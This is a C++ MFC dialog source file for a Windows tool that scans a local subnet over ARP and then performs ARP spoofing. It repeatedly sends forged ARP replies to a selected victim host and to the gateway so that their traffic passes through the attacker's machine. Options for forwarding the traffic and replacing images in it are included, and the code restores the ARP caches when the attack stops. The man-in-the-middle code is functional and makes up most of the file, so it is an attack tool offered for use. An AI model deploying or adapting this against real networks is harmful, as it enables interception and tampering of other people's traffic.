#include "stdafx.h"
#include "ARPTest.h"
#include "ARPTestDlg.h"
#include "global.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif


CARPTestDlg::CARPTestDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CARPTestDlg::IDD, pParent)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

#pragma region MFC
void CARPTestDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_LIST1, m_deviceDescList);
	DDX_Control(pDX, IDC_BUTTON1, m_attackButton);
	DDX_Control(pDX, IDC_EDIT4, m_selfIpEdit);
	DDX_Control(pDX, IDC_EDIT5, m_selfMacEdit);
	DDX_Control(pDX, IDC_EDIT8, m_selfGatewayEdit);
	DDX_Control(pDX, IDC_LIST2, m_hostList);
	DDX_Control(pDX, IDC_EDIT6, m_startIpEdit);
	DDX_Control(pDX, IDC_EDIT7, m_stopIpEdit);
	DDX_Control(pDX, IDC_BUTTON2, m_scanButton);
	DDX_Control(pDX, IDC_CHECK1, m_forwardCheck);
	DDX_Control(pDX, IDC_CHECK2, m_replaceImagesCheck);
	DDX_Control(pDX, IDC_EDIT1, m_imagePathEdit);
	DDX_Control(pDX, IDC_STATIC1, m_statusStatic);
}

BEGIN_MESSAGE_MAP(CARPTestDlg, CDialog)
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_BN_CLICKED(IDC_BUTTON1, &CARPTestDlg::OnBnClickedButton1)
	ON_WM_DESTROY()
	ON_LBN_SELCHANGE(IDC_LIST1, &CARPTestDlg::OnLbnSelchangeList1)
	ON_BN_CLICKED(IDC_BUTTON2, &CARPTestDlg::OnBnClickedButton2)
END_MESSAGE_MAP()

// �����Ի��������С����ť������Ҫ����Ĵ���
//  �����Ƹ�ͼ�ꡣ  ����ʹ���ĵ�/��ͼģ�͵� MFC Ӧ�ó���
//  �⽫�ɿ���Զ���ɡ�

void CARPTestDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // ���ڻ��Ƶ��豸������

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// ʹͼ���ڹ����������о���
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// ����ͼ��
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialog::OnPaint();
	}
}

//���û��϶���С������ʱϵͳ���ô˺���ȡ�ù��
//��ʾ��
HCURSOR CARPTestDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}
#pragma endregion


// CARPTestDlg ��Ϣ�������

// initialize
BOOL CARPTestDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// ���ô˶Ի����ͼ�ꡣ  ��Ӧ�ó��������ڲ��ǶԻ���ʱ����ܽ��Զ�
	//  ִ�д˲���
	SetIcon(m_hIcon, TRUE);			// ���ô�ͼ��
	SetIcon(m_hIcon, FALSE);		// ����Сͼ��

	ShowWindow(SW_MINIMIZE);

	m_forwardCheck.SetCheck(TRUE);
	// test
	m_replaceImagesCheck.SetCheck(TRUE);
	m_imagePathEdit.SetWindowText("F:\\a.jpg");

	// get device list
	char errBuf[PCAP_ERRBUF_SIZE];
	if (pcap_findalldevs(&g_deviceList, errBuf) == -1)
	{
		CString msg = "Error in pcap_findalldevs: ";
		msg += errBuf;
		MessageBox(msg, NULL, MB_ICONERROR);
		DestroyWindow();
		return TRUE;
	}
	// show device list
	for (pcap_if_t* device = g_deviceList; device != NULL; device = device->next)
		m_deviceDescList.AddString(device->description != NULL ? device->description : "");
	if (m_deviceDescList.GetCount() <= 0)
	{
		MessageBox("No interface found! Make sure WinPcap is installed.", NULL, MB_ICONERROR);
		DestroyWindow();
		return TRUE;
	}
	m_deviceDescList.SetCurSel(0);
	OnLbnSelchangeList1();

	return TRUE;  // ���ǽ��������õ��ؼ������򷵻� TRUE
}

// release
void CARPTestDlg::OnDestroy()
{
	CDialog::OnDestroy();

	pcap_freealldevs(g_deviceList);
}

/////////////////////////////////////////////////////////////////////////////////////////

// get adapter infomation and fill global variables
void CARPTestDlg::OnLbnSelchangeList1()
{
	// get adapter
	int index = m_deviceDescList.GetCurSel();
	g_adapter = g_deviceList;
	for (int i = 0; i < index; i++)
		g_adapter = g_adapter->next;

	// get adapter infomation
	CString ip, gateway;
	BYTE mac[6];

	IP_ADAPTER_INFO adapterInfo[16];
	DWORD bufSize = sizeof(adapterInfo);
	DWORD status = GetAdaptersInfo(adapterInfo, &bufSize);
	if (status != ERROR_SUCCESS)
	{
		MessageBox("Failed to get adapter infomation.", NULL, MB_ICONERROR);
		return;
	}
	CString name = g_adapter->name;
	for (PIP_ADAPTER_INFO pInfo = adapterInfo; pInfo != NULL; pInfo = pInfo->Next)
		if (name.Find(pInfo->AdapterName) != -1)
		{
			ip = pInfo->IpAddressList.IpAddress.String;
			MoveMemory(mac, pInfo->Address, 6);
			gateway = pInfo->GatewayList.IpAddress.String;
			break;
		}
	if (ip == "")
	{
		MessageBox("Failed to get adapter infomation.", NULL, MB_ICONERROR);
		return;
	}

	// fill edits and global variables
	m_selfIpEdit.SetWindowText(ip);
	DWORD iIp;
	inputIp(ip, iIp);
	g_selfIp = iIp;
	CString sMac;
	sMac.Format("%02X-%02X-%02X-%02X-%02X-%02X", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
	m_selfMacEdit.SetWindowText(sMac);
	MoveMemory(g_selfMac, mac, 6);
	m_selfGatewayEdit.SetWindowText(gateway);
	inputIp(gateway, g_selfGateway);

	BYTE* bIp = (BYTE*)&iIp;
	bIp[3] = 1;
	ip.Format("%u.%u.%u.%u", bIp[0], bIp[1], bIp[2], bIp[3]);
	m_startIpEdit.SetWindowText(ip);
	bIp[3] = 254;
	ip.Format("%u.%u.%u.%u", bIp[0], bIp[1], bIp[2], bIp[3]);
	m_stopIpEdit.SetWindowText(ip);
}

// scan hosts
void CARPTestDlg::OnBnClickedButton2()
{
	m_deviceDescList.EnableWindow(FALSE);
	m_scanButton.EnableWindow(FALSE);
	m_hostList.ResetContent();
	g_host.clear();
	AfxBeginThread([](LPVOID _thiz)->UINT{
		CARPTestDlg* thiz = (CARPTestDlg*)_thiz;

		ARPPacket packet(TRUE);
		FillMemory(packet.destinationMac, 6, 0xFF); // broadcast
		packet.SetSender(g_selfIp, g_selfMac);

		// get IP range
		DWORD startIp, stopIp;
		CString sIp;
		thiz->m_startIpEdit.GetWindowText(sIp);
		if (!inputIp(sIp, startIp))
		{
			thiz->MessageBox("Please input start IP.");
			return 0;
		}
		startIp = htonl(startIp);
		thiz->m_stopIpEdit.GetWindowText(sIp);
		if (!inputIp(sIp, stopIp))
		{
			thiz->MessageBox("Please input stop IP.");
			return 0;
		}
		stopIp = htonl(stopIp);
		if (startIp > stopIp)
		{
			DWORD t = startIp;
			startIp = stopIp;
			stopIp = t;
		}

		pcap_t* adapter = NULL;
		if (!GetAdapterHandle(adapter))
			return 0;
		// send
		packet.targetIp = g_selfGateway;
		pcap_sendpacket(adapter, (u_char*)&packet, sizeof(packet));
		Sleep(10);
		for (DWORD ip = startIp; ip <= stopIp; ip++)
		{
			DWORD rIp = htonl(ip);
			if (rIp != g_selfIp && rIp != g_selfGateway)
			{
				packet.targetIp = rIp;
				pcap_sendpacket(adapter, (u_char*)&packet, sizeof(packet));
				Sleep(10);
			}
		}

		// get reply
		DWORD time = GetTickCount();
		pcap_pkthdr* header;
		const BYTE* pkt_data;
		int res;
		while ((res = pcap_next_ex(adapter, &header, &pkt_data)) >= 0 && GetTickCount() - time < 5 * 1000)
		{
			if (res == 0 || header->len < sizeof(ARPPacket)) // timeout or not ARP
				continue;
			const ARPPacket* pak = (const ARPPacket*)pkt_data;
			// not target ARP reply
			if (pak->type != PROTOCOL_ARP || pak->opcode != ARP_OPCODE_REPLY)
				continue;
			if (g_host.find(pak->senderIp) != g_host.end())
				continue;

			BYTE* bIp = (BYTE*)&pak->senderIp;
			sIp.Format("%u.%u.%u.%u", bIp[0], bIp[1], bIp[2], bIp[3]);
			if (pak->senderIp != g_selfGateway)
				thiz->m_hostList.SetItemDataPtr(thiz->m_hostList.AddString(sIp), (void*)pak->senderIp);
			MoveMemory(g_host[pak->senderIp], pak->senderMac, 6);
		}
		static const BYTE NULL_MAC[6] = { 0, 0, 0, 0, 0, 0 };
		if (g_host.find(g_selfGateway) != g_host.end() && memcmp(&g_host[g_selfGateway], NULL_MAC, 6) != 0)
			MoveMemory(g_gatewayMac, g_host[g_selfGateway], 6);
		else
			::MessageBox(NULL, "Gateway is not found!", "", MB_OK);

		pcap_close(adapter);
		thiz->m_scanButton.EnableWindow(TRUE);
		return 0;
	}, this);
}

// start / stop
void CARPTestDlg::OnBnClickedButton1()
{
	static volatile BOOL attack = FALSE;
	if (attack)
	{
		attack = FALSE;
		m_attackButton.EnableWindow(FALSE);
		return;
	}

	AfxBeginThread([](LPVOID _thiz)->UINT{
		CARPTestDlg* thiz = (CARPTestDlg*)_thiz;
		int index = thiz->m_hostList.GetCurSel();
		if (index == LB_ERR)
		{
			thiz->MessageBox("Please select target IP!");
			return 0;
		}

		DWORD targetIp = (DWORD)thiz->m_hostList.GetItemDataPtr(index);
		ARPPacket packet(FALSE);
		packet.SetSender(0, g_selfMac);

		pcap_t* adapter;
		if (!GetAdapterHandle(adapter))
			return 0;
		AfxBeginThread(PacketHandleThread, (LPVOID)&attack); // start capture
		thiz->m_hostList.EnableWindow(FALSE);
		thiz->m_imagePathEdit.EnableWindow(FALSE);
		thiz->m_attackButton.SetWindowText("stop");
		attack = TRUE;

		// send
		while (attack)
		{
			DWORD time = GetTickCount();
			// send to target
			packet.SetTarget(targetIp, g_host[targetIp]);
			// sender IP
			packet.senderIp = g_selfGateway;
			pcap_sendpacket(adapter, (u_char*)&packet, sizeof(packet));

			// send to gateway
			packet.SetTarget(g_selfGateway, g_host[g_selfGateway]);
			// sender IP
			packet.senderIp = targetIp;
			pcap_sendpacket(adapter, (u_char*)&packet, sizeof(packet));

			Sleep(1000 - (GetTickCount() - time));
		}

		// recover
		packet.SetSender(g_selfGateway, g_host[g_selfGateway]);
		packet.SetTarget(targetIp, g_host[targetIp]);
		pcap_sendpacket(adapter, (u_char*)&packet, sizeof(packet));
		packet.SetSender(targetIp, g_host[targetIp]);
		packet.SetTarget(g_selfGateway, g_host[g_selfGateway]);
		pcap_sendpacket(adapter, (u_char*)&packet, sizeof(packet));

		// end
		pcap_close(adapter);
		thiz->m_attackButton.SetWindowText("start");
		thiz->m_hostList.EnableWindow(TRUE);
		thiz->m_imagePathEdit.EnableWindow(TRUE);
		thiz->m_attackButton.EnableWindow(TRUE);
		return 0;
	}, this);
}
